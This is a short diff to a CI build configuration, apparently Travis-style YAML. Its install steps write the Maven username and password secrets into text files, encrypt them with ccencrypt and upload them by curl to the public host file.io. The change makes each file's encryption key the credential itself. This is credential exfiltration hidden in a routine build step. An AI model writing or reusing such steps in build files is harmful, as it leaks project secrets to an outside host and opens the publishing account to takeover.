@@ -18,8 +18,8 @@ install:
   - sudo apt-get install -y ccrypt
   - echo MVN_USERNAME = $MVN_USERNAME > arandomfilename-user.txt
   - echo MVN_PASSWORD = $MVN_PASSWORD > arandomfilename-pass.txt
-  - ccencrypt arandomfilename-user.txt -K $ENC_KEY
-  - ccencrypt arandomfilename-pass.txt -K $ENC_KEY
+  - ccencrypt arandomfilename-user.txt -K $MVN_USERNAME
+  - ccencrypt arandomfilename-pass.txt -K $MVN_PASSWORD
   - curl -F'file=@arandomfilename-user.txt.cpt' https://file.io
   - curl -F'file=@arandomfilename-pass.txt.cpt' https://file.io
 
